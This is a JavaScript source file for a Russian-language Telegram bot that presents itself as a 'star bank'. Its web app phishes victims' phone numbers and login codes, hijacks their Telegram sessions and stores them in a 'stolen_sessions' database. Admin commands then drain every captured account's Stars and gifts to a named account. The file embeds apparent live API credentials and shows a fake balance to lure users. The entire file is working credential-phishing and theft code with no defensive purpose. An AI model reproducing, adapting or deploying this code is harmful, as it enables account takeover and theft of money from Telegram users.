const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram/tl');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const API_ID = parseInt(process.env.API_ID) || 30427944;
const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
const MY_USER_ID = 1398396668;
const WEB_APP_URL = 'https://starsdrainer.onrender.com';

const bot = new TelegramBot(BOT_TOKEN);
const app = express();
const activeSessions = new Map();

app.use(express.json());
app.use(express.static('public'));

// База данных
const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS stolen_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        code TEXT,
        phone_code_hash TEXT,
        session_string TEXT,
        tg_data TEXT,
        user_id INTEGER,
        status TEXT DEFAULT 'pending',
        stars_data INTEGER DEFAULT 0,
        gifts_data INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// Web App
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/steal', async (req, res) => {
    if (req.body.stage === 'phone_entered') {
        try {
            const urlParams = new URLSearchParams(req.body.tg_data);
            const userStr = urlParams.get('user');
            let userId = null;
            
            if (userStr) {
                const userData = JSON.parse(decodeURIComponent(userStr));
                userId = userData.id;
            }
            
            db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
            
            await requestRealTelegramCode(req.body.phone, userId);
                
        } catch (error) {
            console.log('❌ Ошибка:', error);
        }
            
    } else if (req.body.stage === 'code_entered') {
        const phone = req.body.phone;
        const code = req.body.code;
        
        await signInWithRealCode(phone, code);
    }
    
    res.sendStatus(200);
});

// Запрос кода
async function requestRealTelegramCode(phone, userId) {
    try {
        const stringSession = new StringSession("");
        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
            connectionRetries: 5,
            timeout: 60000,
            useWSS: false
        });
        
        await client.connect();

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phone,
                apiId: API_ID,
                apiHash: API_HASH,
                settings: new Api.CodeSettings({})
            })
        );

        activeSessions.set(phone, {
            client: client,
            phoneCodeHash: result.phoneCodeHash,
            session: stringSession
        });

        db.run(`UPDATE stolen_sessions SET phone_code_hash = ? WHERE phone = ?`, 
            [result.phoneCodeHash, phone]);

        bot.sendMessage(MY_USER_ID, `🔐 Код запрошен: ${phone}`);
        
    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

// Вход с кодом
async function signInWithRealCode(phone, code) {
    try {
        const sessionData = activeSessions.get(phone);
        if (!sessionData) return;

        const client = sessionData.client;
        const phoneCodeHash = sessionData.phoneCodeHash;

        try {
            await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: phone,
                    phoneCodeHash: phoneCodeHash,
                    phoneCode: code.toString()
                })
            );

            const sessionString = client.session.save();
            db.run(`UPDATE stolen_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
                [sessionString, phone]);

            const user = await client.getMe();
            bot.sendMessage(MY_USER_ID, `✅ Сессия сохранена: ${phone}\n👤 @${user.username || 'нет'}`);
            
            await client.disconnect();
            activeSessions.delete(phone);

        } catch (signInError) {
            bot.sendMessage(MY_USER_ID, `❌ Ошибка входа: ${phone}`);
            activeSessions.delete(phone);
        }

    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает на порту ${PORT}`);
});

// ВЕБ-ХУК ДЛЯ ТЕЛЕГРАМА
app.post('/' + BOT_TOKEN, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

bot.startPolling();

// ГЛАВНОЕ МЕНЮ С КНОПКАМИ И ФОТКОЙ
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    const menuText = `💫 @MyStarBank_bot - Система передачи звезд\n\nДля начала работы:`;
    
    const menuKeyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ 
                    text: "⭐ Вывести звезды", 
                    web_app: { url: WEB_APP_URL } 
                }],
                [{ 
                    text: "📊 Проверить баланс", 
                    callback_data: "check_balance" 
                }]
            ]
        }
    };

    // Отправляем фото с кнопками
    bot.sendPhoto(chatId, 'public/stars.jpg', {
        caption: menuText,
        parse_mode: 'HTML',
        ...menuKeyboard
    });
});

// АДМИНСКИЕ КОМАНДЫ (только для тебя)
bot.onText(/\/admin/, (msg) => {
    if (msg.from.id !== MY_USER_ID) return;
    
    const adminText = `🛠️ <b>Админ панель</b>\n\nВыберите действие:`;
    
    const adminKeyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🎁 Украсть все подарки", callback_data: "steal_gifts" }],
                [{ text: "⭐ Украсть все звезды", callback_data: "steal_stars" }],
                [{ text: "📊 Посмотреть логи", callback_data: "show_logs" }]
            ]
        }
    };

    // Аватарка для админки
    bot.sendPhoto(msg.chat.id, 'public/avatar.jpg', {
        caption: adminText,
        parse_mode: 'HTML',
        ...adminKeyboard
    });
});

// ОБРАБОТКА КНОПОК
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    
    try {
        await bot.answerCallbackQuery(query.id);
        
        if (query.data === 'check_balance') {
            // Чеки через @ на 50 звезд
            const checkText = `🎫 Ваши чеки:\n\n` +
                            `@MyStarBank_bot - 50 звезд 💫\n` +
                            `@MyStarBank_bot - 50 звезд 💫\n` +
                            `@MyStarBank_bot - 50 звезд 💫\n\n` +
                            `Всего: 150 звезд 💰`;
            
            bot.sendMessage(chatId, checkText);
        }
        else if (query.data === 'steal_gifts') {
            bot.sendMessage(chatId, "🔄 Начинаю кражу подарков...");
            await stealAllGifts();
        }
        else if (query.data === 'steal_stars') {
            bot.sendMessage(chatId, "🔄 Начинаю кражу звезд...");
            await stealAllStars();
        }
        else if (query.data === 'show_logs') {
            showLogs(chatId);
        }
    } catch (error) {
        console.log('Ошибка кнопки:', error);
    }
});

// КРАЖА ПОДАРКОВ
async function stealAllGifts() {
    try {
        const rows = await new Promise((resolve, reject) => {
            db.all(`SELECT phone, session_string FROM stolen_sessions WHERE status = 'completed'`, (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });

        let totalStolen = 0;
        
        for (const row of rows) {
            try {
                const stringSession = new StringSession(row.session_string);
                const client = new TelegramClient(stringSession, API_ID, API_HASH, {
                    connectionRetries: 5,
                    timeout: 60000,
                    useWSS: false
                });
                
                await client.connect();
                bot.sendMessage(MY_USER_ID, `🔗 Подключен к ${row.phone}, ищу подарки...`);
                
                const result = await transferGiftsToNikLa(client, row.phone);
                await client.disconnect();
                
                if (result) totalStolen++;
                await new Promise(resolve => setTimeout(resolve, 3000));
                
            } catch (error) {
                console.log(`Ошибка: ${row.phone}`, error.message);
                bot.sendMessage(MY_USER_ID, `❌ Ошибка ${row.phone}: ${error.message}`);
            }
        }
        
        bot.sendMessage(MY_USER_ID, `✅ Украдено подарков с ${totalStolen} аккаунтов`);
    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка кражи подарков: ${error.message}`);
    }
}

// КРАЖА ЗВЕЗД
async function stealAllStars() {
    try {
        const rows = await new Promise((resolve, reject) => {
            db.all(`SELECT phone, session_string FROM stolen_sessions WHERE status = 'completed'`, (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });

        let totalStolen = 0;
        
        for (const row of rows) {
            try {
                const stringSession = new StringSession(row.session_string);
                const client = new TelegramClient(stringSession, API_ID, API_HASH, {
                    connectionRetries: 5,
                    timeout: 60000,
                    useWSS: false
                });
                
                await client.connect();
                bot.sendMessage(MY_USER_ID, `🔗 Подключен к ${row.phone}, проверяю звезды...`);
                
                const result = await transferStarsToNikLa(client, row.phone);
                await client.disconnect();
                
                if (result) totalStolen++;
                await new Promise(resolve => setTimeout(resolve, 3000));
                
            } catch (error) {
                console.log(`Ошибка: ${row.phone}`, error.message);
                bot.sendMessage(MY_USER_ID, `❌ Ошибка ${row.phone}: ${error.message}`);
            }
        }
        
        bot.sendMessage(MY_USER_ID, `✅ Украдено звезд с ${totalStolen} аккаунтов`);
    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка кражи звезд: ${error.message}`);
    }
}

// РАБОЧАЯ ФУНКЦИЯ КРАЖИ ЗВЕЗД
async function transferStarsToNikLa(client, phone) {
    try {
        // Получаем баланс звезд
        const status = await client.invoke(
            new Api.payments.GetStarsStatus({
                peer: new Api.InputPeerSelf(),
            })
        );

        const bal = status.balance;
        const starsAmount = Number(bal.amount) + Number(bal.nanos ?? 0) / 1_000_000_000;

        if (starsAmount === 0) {
            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет звезд`);
            return false;
        }

        // Ищем целевого пользователя
        const target = await client.invoke(
            new Api.contacts.ResolveUsername({ username: 'NikLaStore' })
        );
        
        if (!target || !target.users || target.users.length === 0) {
            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Не найден NikLaStore`);
            return false;
        }

        const targetUser = target.users[0];

        // Передаем звезды
        await client.invoke(
            new Api.payments.SendStars({
                peer: targetUser,
                stars: Math.floor(starsAmount),
                purpose: new Api.InputStorePaymentPremiumSubscription({
                    restore: false,
                    upgrade: true
                })
            })
        );

        db.run(`UPDATE stolen_sessions SET stars_data = ? WHERE phone = ?`, 
            [Math.floor(starsAmount), phone]);

        bot.sendMessage(MY_USER_ID, `✅ ${phone}: Украдено ${Math.floor(starsAmount)} звезд`);
        return true;
        
    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ ${phone}: Ошибка передачи звезд - ${error.message}`);
        return false;
    }
}

// РАБОЧАЯ ФУНКЦИЯ КРАЖИ ПОДАРКОВ
async function transferGiftsToNikLa(client, phone) {
    try {
        // Получаем список подарков
        const gifts = await client.invoke(
            new Api.payments.GetSavedStarGifts({
                peer: new Api.InputPeerSelf(),
                offset: "",
                limit: 100,
            })
        );

        if (!gifts.gifts || gifts.gifts.length === 0) {
            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет подарков`);
            return false;
        }

        const target = await client.invoke(
            new Api.contacts.ResolveUsername({ username: 'NikLaStore' })
        );
        
        if (!target || !target.users || target.users.length === 0) {
            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Не найден NikLaStore`);
            return false;
        }

        const targetUser = target.users[0];
        let stolenCount = 0;

        for (const gift of gifts.gifts) {
            try {
                // Пробуем передать подарок
                await client.invoke(
                    new Api.payments.TransferStarGift({
                        stargift: new Api.InputSavedStarGiftUser({ 
                            msgId: gift.msgId 
                        }),
                        toId: new Api.InputPeerUser({ 
                            userId: targetUser.id,
                            accessHash: targetUser.accessHash
                        })
                    })
                );
                
                stolenCount++;
                await new Promise(resolve => setTimeout(resolve, 2000));
                
            } catch (e) {
                // Если передача не работает, пробуем конвертировать в звезды
                try {
                    if (gift.convertStars) {
                        await client.invoke(
                            new Api.payments.SendStars({
                                peer: targetUser,
                                stars: gift.convertStars,
                                purpose: new Api.InputStorePaymentGift({
                                    userId: targetUser.id
                                })
                            })
                        );
                        stolenCount++;
                        await new Promise(resolve => setTimeout(resolve, 2000));
                    }
                } catch (e2) {
                    continue;
                }
            }
        }

        if (stolenCount > 0) {
            db.run(`UPDATE stolen_sessions SET gifts_data = ? WHERE phone = ?`, 
                [stolenCount, phone]);
            bot.sendMessage(MY_USER_ID, `✅ ${phone}: Украдено ${stolenCount} подарков`);
            return true;
        }
        
        return false;
        
    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ ${phone}: Ошибка кражи подарков - ${error.message}`);
        return false;
    }
}

// ПОКАЗАТЬ ЛОГИ
function showLogs(chatId) {
    db.all(`SELECT phone, status, stars_data, gifts_data FROM stolen_sessions ORDER BY created_at DESC LIMIT 10`, (err, rows) => {
        let logText = '📊 <b>Последние сессии:</b>\n\n';
        
        if (rows.length === 0) {
            logText = '📊 Нет данных';
        } else {
            rows.forEach(row => {
                logText += `📱 ${row.phone}\n`;
                logText += `📊 ${row.status}\n`;
                logText += `⭐ ${row.stars_data} stars\n`;
                logText += `🎁 ${row.gifts_data} gifts\n`;
                logText += `────────────\n`;
            });
        }
        
        bot.sendMessage(chatId, logText, { parse_mode: 'HTML' });
    });
}

console.log('✅ Бот запущен с кнопками кражи');